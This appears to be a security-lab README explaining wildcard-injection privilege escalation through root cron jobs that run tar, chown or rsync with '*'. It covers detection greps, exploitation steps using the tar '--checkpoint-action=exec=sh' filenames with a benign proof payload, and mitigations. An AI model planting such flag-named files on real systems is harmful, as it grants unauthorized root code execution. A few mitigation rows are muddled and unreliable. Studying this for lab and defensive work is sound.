# Wildcard Injection

## Overview

Unix shells and many command-line tools expand globs (`*`, `?`, `[...]`) **before** the target program parses its argument list. When a **privileged script or cron job** runs a command like `tar`, `chown`, or `rsync` with a wildcard in a **world-writable directory**, an attacker can create files whose **names look like command-line flags**. After expansion, those filenames become **real arguments** to the privileged command.

This class of bug is sometimes called **argument injection via wildcard expansion** or **tar wildcard abuse**. It is not a flaw in `tar` itself—it is unsafe usage of wildcards in scripts running as root.

### Classic examples

| Technique | Privileged command pattern | Malicious filename(s) |
|-----------|---------------------------|------------------------|
| **Tar checkpoint** | `tar czf /backup/archive.tar.gz *` | `--checkpoint=1`, `--checkpoint-action=exec=sh poc.sh` |
| **Chown recursive** | `chown root:root *` | `--no-preserve-root`, `-R`, `attacker:attacker`, `/etc` (varies by version/context) |
| **Rsync / cp patterns** | `rsync -a src/* dest/` | Filenames starting with `-` that become options |

Well-known write-ups include the **tar wildcard** technique (checkpoint options added in GNU tar 1.22+) and **exim4 / chown** style wildcard issues in Debian packaging history—same root cause: **unquoted `*` in a directory an attacker controls**.

**Lab scenario:** Root cron runs a backup script that executes `tar czf ... *` inside a world-writable staging directory. A local user plants flag-like filenames and gains code execution as root when cron fires.

---

## Detection

### Find privileged wildcard usage

```bash
# Cron jobs (system and user)
grep -rE '\*' /etc/cron* /var/spool/cron 2>/dev/null

# Init scripts and admin tooling
grep -rE '\btar\b.*\*|\bchown\b.*\*|\brsync\b.*\*' /etc /usr/local/sbin 2>/dev/null

# World-writable directories referenced by root jobs
find / -type d -perm -0002 2>/dev/null
```

### Red flags

- Root scripts that `cd` into a user-influenced directory then run `tar ... *`, `chown ... *`, or `cp ... *`
- Unquoted globs in `/etc/cron.d/`, `/etc/cron.daily/`, or custom `systemd` `ExecStart` wrappers
- Backup/sync jobs operating on directories writable by service accounts or all users

### Safe inspection of a suspect script

```bash
cat /usr/local/sbin/lab-wildcard-backup.sh
ls -la /var/lib/lab-wildcard-staging/
namei -l /var/lib/lab-wildcard-staging   # trace path permissions
```

If the staging directory is world-writable (`drwxrwxrwx` or `1777`) and the script uses `*`, treat it as exploitable until proven otherwise.

---

## Exploitation

**Prerequisites:** A root-run script or cron job that uses a wildcard on files in a directory you can write to.

### General steps

1. **Identify the exact command** — note tool (`tar`, `chown`, …), flags, and working directory.
2. **Confirm write access** to the directory where `*` expands.
3. **Craft filenames that become flags** after glob expansion — e.g. for GNU tar: `--checkpoint=1` and `--checkpoint-action=exec=/path/to/payload.sh`.
4. **Plant a small payload script** — in the lab, only write a root-owned proof file or run `id > /tmp/proof`.
5. **Wait for cron** or trigger the backup manually if you have visibility into the schedule.

### Lab usage

```bash
# As root — install cron job + staging directory
sudo ./vulnerable-setup.sh

# As an unprivileged lab user — plant malicious filenames
./exploit.sh

# Trigger immediately (lab convenience) or wait for cron
sudo /usr/local/sbin/lab-wildcard-backup.sh
```

After successful exploitation, `/tmp/wildcard-injection-proof` is created owned by root.

### What the expanded command looks like (tar example)

Script runs:

```bash
cd /var/lib/lab-wildcard-staging && tar czf /var/backups/lab-wildcard.tar.gz *
```

Directory contains files literally named:

```
--checkpoint=1
--checkpoint-action=exec=sh /tmp/wildcard-payload.sh
```

Effective command:

```bash
tar czf /var/backups/lab-wildcard.tar.gz --checkpoint=1 --checkpoint-action=exec=sh /tmp/wildcard-payload.sh
```

GNU tar interprets the injected flags and executes the payload as root.

---

## Mitigation

| Control | Description |
|--------|-------------|
| **Avoid wildcards in privileged contexts** | Use `find ... -print0 \| tar --null -T -` or explicit file lists instead of `*`. |
| **Use `--` end-of-options** | Many tools stop parsing flags after `--`: `tar czf out.tar -- *` still expands `*` in the shell—prefer `find` or `.` with `--exclude`. |
| **Quote and validate paths** | Operate on fixed, root-owned directories with strict permissions (`0750`), never world-writable staging. |
| **Use `--checkpoint=0` explicitly** | For GNU tar in scripts, disable checkpoint features if not needed. |
| **Principle of least privilege** | Run backups as a dedicated user with write access only to intended targets. |
| **Audit cron and packaging scripts** | Grep for `\` at end of lines and unquoted `*` in maintainer scripts. |

Safer backup pattern:

```bash
# Root-owned, non-world-writable source
SRC="/var/lib/app-data"
tar -C "${SRC}" -czf /var/backups/app-data.tar.gz .
# Or:
find "${SRC}" -type f -print0 | tar -czf /var/backups/app-data.tar.gz --null -T -
```

---

## References

- [Woolyss — Tar wildcard exploitation (checkpoint technique)](https://matt.woolyss.com/download/privilege/privilege.html)
- CVE-style discussions: GNU tar `--checkpoint-action` (tar 1.22+), historical `chown *` issues in maintainer scripts
- [GTFOBins — tar](https://gtfobins.github.io/gtfobins/tar/)
- MITRE ATT&CK: [T1574 — Hijack Execution Flow](https://attack.mitre.org/techniques/T1574/) (related execution abuse patterns)
- [Linux man pages: tar(1), glob(7), bash(1) — Pathname Expansion](https://man7.org/linux/man-pages/)
